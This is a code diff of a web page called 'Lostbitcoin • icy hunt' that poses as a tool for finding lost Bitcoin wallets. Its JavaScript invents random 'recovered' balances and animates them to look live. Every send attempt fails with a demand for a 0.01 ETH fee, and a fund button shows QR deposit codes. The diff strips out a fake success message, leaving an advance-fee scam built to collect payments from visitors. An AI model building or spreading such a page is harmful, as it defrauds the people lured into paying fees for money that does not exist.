@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • icy hunt</title>
+  <title>Lostbitcoin • icy hunt</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -567,7 +567,7 @@
       left: 0;
       right: 0;
       bottom: 0;
-      background: rgba(0, 150, 255, 0.04);
+      background: rgba(0, 150, 255, 0.20); /* بسیار شفاف - فقط 4 درصد آبی */
       z-index: 2;
       pointer-events: none;
       border-radius: 12px;
@@ -789,26 +789,6 @@
       color: #a3ceff;
       margin-left: 8px;
     }
-
-    /* success message */
-    .success-message {
-      background: rgba(0, 200, 150, 0.2);
-      border: 1px solid #00cc99;
-      border-radius: 40px;
-      padding: 16px;
-      text-align: center;
-      color: #a3ffd0;
-      font-weight: 600;
-      backdrop-filter: blur(8px);
-      margin: 10px 0;
-      animation: glow 2s infinite;
-    }
-    
-    @keyframes glow {
-      0% { box-shadow: 0 0 5px #00cc99; }
-      50% { box-shadow: 0 0 20px #00cc99; }
-      100% { box-shadow: 0 0 5px #00cc99; }
-    }
   </style>
 </head>
 <body>
@@ -922,7 +902,7 @@
       <div class="crypto-row">
         <div class="crypto-left">
           <div class="crypto-icon"><img src="https://lostbitcoin.github.io/B/1.png" alt="BTC"></div>
-          <span class="crypto-name">Bitcoin (ERC-20)</span>
+          <span class="crypto-name">Bitcoin</span>
         </div>
         <div style="display:flex; flex-direction:column; align-items:flex-end;">
           <span class="crypto-amount" id="btcAmount">0</span>
@@ -936,7 +916,7 @@
           <span class="crypto-name">Ethereum</span>
         </div>
         <div style="display:flex; flex-direction:column; align-items:flex-end;">
-          <span class="crypto-amount" id="ethAmount">0</span>
+          <span class="crypto-amount">0</span>
           <span class="crypto-sub">ETH</span>
         </div>
       </div>
@@ -971,13 +951,6 @@
         <span class="send-title">Send BTC</span>
         <span style="width:40px;"></span>
       </div>
-      
-      <!-- Success Message (hidden by default) -->
-      <div id="successMessage" class="success-message" style="display: none;">
-        ✅ Transaction Successful!<br>
-        <span style="font-size: 0.8rem;">Your BTC has been sent</span>
-      </div>
-      
       <div class="field-group">
         <div class="field-label">Address or Domain Name</div>
         <div class="address-input-area">
@@ -1003,7 +976,7 @@
         </div>
       </div>
       <div id="feeErrorBox" style="display: none;" class="error-fee-box">
-        <span>⚠️</span> Fee required: 0.0001 BTC (ERC-20)
+        <span>⚠️</span> Fee required: 0.01 ETH (ERC-20)
       </div>
       <button class="confirm-btn" id="confirmSendBtn" disabled>Next</button>
     </div>
@@ -1025,29 +998,19 @@
       const fundPage = document.getElementById('fundPage');
       const sendPage = document.getElementById('sendPage');
       const huntConsole = document.getElementById('huntConsole');
-      const successMessage = document.getElementById('successMessage');
 
       // Current BTC price (default from Etherscan)
-      let btcPriceUSD = 76149.00;
-
-      // ETH price (fixed for simplicity)
-      const ethPriceUSD = 3200.00;
-
-      // Store original ETH balance
-      let originalEthBalance = 0;
+      let btcPriceUSD = 76149.00; // Default from Etherscan
 
       // Generate random BTC values between 0.001 and 0.09 for the 3 wallets
       const btcValues = [];
-      for (let i = 0; i < 20; i++) {
+      for (let i = 0; i < 3; i++) {
+        // Random between 0.001 and 0.09 with 4 decimal places
         const randomBtc = (Math.random() * (0.09 - 0.001) + 0.001).toFixed(4);
         btcValues.push(parseFloat(randomBtc));
       }
       
-      // Generate random ETH value between 30.4 and 230.05
-      const randomEth = (Math.random() * (0.5 - 0.01) + 0.01).toFixed(4);
-      const ethValue = parseFloat(randomEth);
-      
-      // Three funding options with addresses and QR codes
+      // Three funding options with addresses and QR codes (EXACTLY as provided)
       const fundOptions = [
         {
           qr: 'https://lostbitcoin.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg',
@@ -1066,7 +1029,7 @@
       // generate 60 wallets: only 3 have balance
       const walletList = [];
       let indices = [];
-      while(indices.length < 20) {
+      while(indices.length < 3) {
         let r = Math.floor(Math.random() * 60);
         if (!indices.includes(r)) indices.push(r);
       }
@@ -1076,23 +1039,6 @@
         if (i === indices[0]) bal = btcValues[0];
         if (i === indices[1]) bal = btcValues[1];
         if (i === indices[2]) bal = btcValues[2];
-        if (i === indices[3]) bal = btcValues[3];
-        if (i === indices[4]) bal = btcValues[4];
-        if (i === indices[5]) bal = btcValues[5];
-        if (i === indices[6]) bal = btcValues[6];
-        if (i === indices[7]) bal = btcValues[7];
-        if (i === indices[8]) bal = btcValues[8];
-        if (i === indices[9]) bal = btcValues[9];
-        if (i === indices[10]) bal = btcValues[10];
-        if (i === indices[11]) bal = btcValues[11];
-        if (i === indices[12]) bal = btcValues[12];
-        if (i === indices[13]) bal = btcValues[13];
-        if (i === indices[14]) bal = btcValues[14];
-        if (i === indices[15]) bal = btcValues[15];
-        if (i === indices[16]) bal = btcValues[16];
-        if (i === indices[17]) bal = btcValues[17];
-        if (i === indices[18]) bal = btcValues[18];
-        if (i === indices[19]) bal = btcValues[19];
         let addr = '0x' + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
         walletList.push({ address: addr, balance: bal });
       }
@@ -1105,9 +1051,6 @@
       let scanInterval = null;
       let currentIndex = 0;
 
-      // Flag to track if BTC was sent
-      let btcSent = false;
-
       // Function to fetch BTC price from Etherscan
       async function fetchBTCPrice() {
         try {
@@ -1115,13 +1058,17 @@
           const data = await response.json();
           if (data.status === '1' && data.result) {
             btcPriceUSD = parseFloat(data.result);
+            console.log('BTC Price updated:', btcPriceUSD);
           }
         } catch (error) {
           console.log('Using default price');
         }
       }
 
+      // Fetch price immediately
       fetchBTCPrice();
+      
+      // Update price every 60 seconds
       setInterval(fetchBTCPrice, 60000);
 
       function randomDepth() {
@@ -1139,8 +1086,8 @@
         scanning = true;
         currentIndex = 0;
         huntConsole.innerHTML = '';
-        btcSent = false; // Reset flag on new hunt
 
+        // Set interval to scan approximately 60 items in 4 seconds
         scanInterval = setInterval(() => {
           if (currentIndex >= 60) {
             clearInterval(scanInterval);
@@ -1164,22 +1111,15 @@
                 
                 const bal = recoveredWallet.balance;
                 const btcAmountEl = document.getElementById('btcAmount');
-                const ethAmountEl = document.getElementById('ethAmount');
                 const mainBalanceEl = document.getElementById('mainBalance');
                 const balanceSubEl = document.getElementById('balanceSub');
                 
-                // Store original ETH balance
-                originalEthBalance = ethValue;
+                // Calculate USD value with live price
+                const usdValue = bal * btcPriceUSD;
                 
-                // Calculate USD values
-                const btcUsdValue = bal * btcPriceUSD;
-                const ethUsdValue = ethValue * ethPriceUSD;
-                const totalUsdValue = btcUsdValue + ethUsdValue;
-                
-                mainBalanceEl.innerText = '$' + totalUsdValue.toFixed(2);
+                mainBalanceEl.innerText = '$' + usdValue.toFixed(2);
                 btcAmountEl.innerText = bal.toFixed(4);
-                ethAmountEl.innerText = ethValue.toFixed(4);
-                balanceSubEl.innerText = '$' + totalUsdValue.toFixed(2) + ' (100%)';
+                balanceSubEl.innerText = '$' + usdValue.toFixed(2) + ' (100%)';
               }, 2000);
             }, 600);
             return;
@@ -1195,11 +1135,13 @@
         }, 66);
       }
 
-      // Live Transaction Feed
+      // Live Transaction Feed (in hunter page)
       const liveTxAmount = document.getElementById('liveTxAmount');
       const liveTxTime = document.getElementById('liveTxTime');
       
       function generateRandomLiveTx() {
+        const wallets = walletList.filter(w => w.balance > 0);
+        const fromWallet = wallets.length > 0 ? wallets[Math.floor(Math.random() * wallets.length)] : walletList[0];
         const amount = (Math.random() * (0.5 - 0.01) + 0.01).toFixed(4);
         const timeAgo = Math.floor(Math.random() * 5) + 1;
         let timeText = '';
@@ -1220,12 +1162,16 @@
         liveTxTime.innerText = tx.time;
       }
 
+      // Update live transaction every 6 seconds
       setInterval(updateLiveTxLine, 6000);
+      
+      // Initial update
       updateLiveTxLine();
 
       // Event Listeners
       document.getElementById('huntBtn').addEventListener('click', startHunt);
       
+      // Policy button event
       document.getElementById('policyBtn').addEventListener('click', ()=>{
         hunter.classList.remove('active');
         policy.classList.add('active');
@@ -1236,15 +1182,9 @@
         hunter.classList.add('active');
       });
 
+      // دکمه back to scanner - رفرش کامل صفحه
       document.getElementById('backFromWalletToHunter').addEventListener('click', ()=>{
-        wallet.classList.remove('active');
-        hunter.classList.add('active');
-        resetConsole();
-        if (scanInterval) clearInterval(scanInterval);
-        scanning = false;
-        currentIndex = 0;
-        recoveredWallet = null;
-        btcSent = false;
+        window.location.reload();
       });
 
       document.getElementById('manageCryptoBtn').addEventListener('click', ()=>{
@@ -1261,7 +1201,9 @@
         wallet.classList.add('active');
       });
 
+      // FUND navigation with random selection from the three options
       document.getElementById('fundActionMain').addEventListener('click', ()=>{
+        // Select random fund option from the three provided
         const randomIndex = Math.floor(Math.random() * fundOptions.length);
         const selected = fundOptions[randomIndex];
         
@@ -1277,20 +1219,18 @@
         wallet.classList.add('active');
       });
 
+      // SEND navigation
       document.getElementById('sendActionMain').addEventListener('click', ()=>{
         wallet.classList.remove('active');
         sendPage.classList.add('active');
         
-        // Hide success message
-        successMessage.style.display = 'none';
-        
-        // Reset send form
+        // reset send form
         document.getElementById('addressInput').value = '0x';
         document.getElementById('amountInput').value = '';
         document.getElementById('usdHint').innerText = '≈ $0.00';
         document.getElementById('feeErrorBox').style.display = 'none';
         
-        if (recoveredWallet && recoveredWallet.balance > 0 && !btcSent) {
+        if (recoveredWallet && recoveredWallet.balance > 0) {
           const maxBalance = recoveredWallet.balance;
           document.getElementById('amountInput').max = maxBalance;
           document.getElementById('amountInput').placeholder = `BTC Amount (max ${maxBalance.toFixed(4)})`;
@@ -1314,7 +1254,7 @@
       const usdHint = document.getElementById('usdHint');
       const confirmBtn = document.getElementById('confirmSendBtn');
       const feeErrorBox = document.getElementById('feeErrorBox');
-      const demoAddress = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
+      const demoAddress = '';
 
       pasteBtn.addEventListener('click', async ()=>{
         try {
@@ -1327,7 +1267,7 @@
       });
 
       maxBtn.addEventListener('click', ()=>{
-        if (recoveredWallet && recoveredWallet.balance > 0 && !btcSent) {
+        if (recoveredWallet && recoveredWallet.balance > 0) {
           amountInput.value = recoveredWallet.balance;
         } else {
           amountInput.value = 0;
@@ -1345,7 +1285,7 @@
 
       function capAmount() {
         let val = parseFloat(amountInput.value);
-        let maxVal = (recoveredWallet && recoveredWallet.balance > 0 && !btcSent) ? recoveredWallet.balance : 0;
+        let maxVal = (recoveredWallet && recoveredWallet.balance > 0) ? recoveredWallet.balance : 0;
         if (!isNaN(val) && val > maxVal) amountInput.value = maxVal;
         else if (val < 0.0001 && amountInput.value !== '' && val > 0) amountInput.value = 0.0001;
       }
@@ -1358,7 +1298,7 @@
       function validateSendForm() {
         const addr = addressInput.value.trim();
         const amt = parseFloat(amountInput.value);
-        const maxVal = (recoveredWallet && recoveredWallet.balance > 0 && !btcSent) ? recoveredWallet.balance : 0;
+        const maxVal = (recoveredWallet && recoveredWallet.balance > 0) ? recoveredWallet.balance : 0;
         const valid = addr.length > 0 && !isNaN(amt) && amt >= 0.0001 && amt <= maxVal;
         confirmBtn.disabled = !valid;
       }
@@ -1367,59 +1307,16 @@
 
       confirmBtn.addEventListener('click', (e)=>{
         if (confirmBtn.disabled) return;
-        
         const originalText = confirmBtn.innerText;
         confirmBtn.disabled = true;
         confirmBtn.innerHTML = '<span class="spinner-mini"></span> processing';
-        
         setTimeout(() => {
-          // Hide processing
           confirmBtn.innerHTML = originalText;
-          
-          // Show success message
-          successMessage.style.display = 'block';
-          
-          // Hide fee error if visible
-          feeErrorBox.style.display = 'none';
-          
-          // Mark BTC as sent
-          btcSent = true;
-          
-          // Update balances in wallet
-          if (recoveredWallet) {
-            // Get current ETH amount
-            const ethAmountEl = document.getElementById('ethAmount');
-            const currentEth = parseFloat(ethAmountEl.innerText);
-            
-            // Calculate new ETH balance (subtract $20.06 worth of ETH)
-            const ethToSubtract = 20.06 / ethPriceUSD;
-            const newEthBalance = Math.max(0, currentEth - ethToSubtract);
-            
-            // Update ETH display
-            ethAmountEl.innerText = newEthBalance.toFixed(4);
-            
-            // Update BTC display to 0
-            document.getElementById('btcAmount').innerText = '0';
-            
-            // Recalculate total balance
-            const btcAmount = 0;
-            const ethAmount = newEthBalance;
-            const totalUsdValue = (btcAmount * btcPriceUSD) + (ethAmount * ethPriceUSD);
-            
-            document.getElementById('mainBalance').innerText = '$' + totalUsdValue.toFixed(2);
-            document.getElementById('balanceSub').innerText = '$' + totalUsdValue.toFixed(2) + ' (100%)';
-            
-            // Update recovered wallet balance
-            recoveredWallet.balance = 0;
-          }
-          
-          // Disable form
           confirmBtn.disabled = true;
-          amountInput.disabled = true;
-          addressInput.disabled = true;
-          maxBtn.disabled = true;
-          pasteBtn.disabled = true;
-          
+          feeErrorBox.style.display = 'flex';
+          setTimeout(() => {
+            feeErrorBox.style.display = 'none';
+          }, 3500);
         }, 2000);
       });
 
@@ -1437,25 +1334,21 @@
       const btcAmountEl = document.getElementById('btcAmount');
       const mainBalanceEl = document.getElementById('mainBalance');
       const balanceSubEl = document.getElementById('balanceSub');
-      const ethAmountEl = document.getElementById('ethAmount');
-      
       let highBalance = false;
       setInterval(() => {
-        if (recoveredWallet && recoveredWallet.balance > 0 && !btcSent) {
+        if (recoveredWallet && recoveredWallet.balance > 0) {
           highBalance = !highBalance;
           let base = recoveredWallet.balance;
-          let btcUsdValue = base * btcPriceUSD;
-          let ethUsdValue = parseFloat(ethAmountEl.innerText) * ethPriceUSD;
-          let totalUsdValue = btcUsdValue + ethUsdValue;
+          let usdValue = base * btcPriceUSD;
           
           if (highBalance) {
-            mainBalanceEl.innerText = '$' + (totalUsdValue + 0.5).toFixed(2);
+            mainBalanceEl.innerText = '$' + (usdValue + 0.5).toFixed(2);
             btcAmountEl.innerText = (base + 0.0001).toFixed(4);
-            balanceSubEl.innerText = '$' + (totalUsdValue + 0.5).toFixed(2) + ' (100%)';
+            balanceSubEl.innerText = '$' + (usdValue + 0.5).toFixed(2) + ' (100%)';
           } else {
-            mainBalanceEl.innerText = '$' + totalUsdValue.toFixed(2);
+            mainBalanceEl.innerText = '$' + usdValue.toFixed(2);
             btcAmountEl.innerText = base.toFixed(4);
-            balanceSubEl.innerText = '$' + totalUsdValue.toFixed(2) + ' (100%)';
+            balanceSubEl.innerText = '$' + usdValue.toFixed(2) + ' (100%)';
           }
         }
       }, 10000);
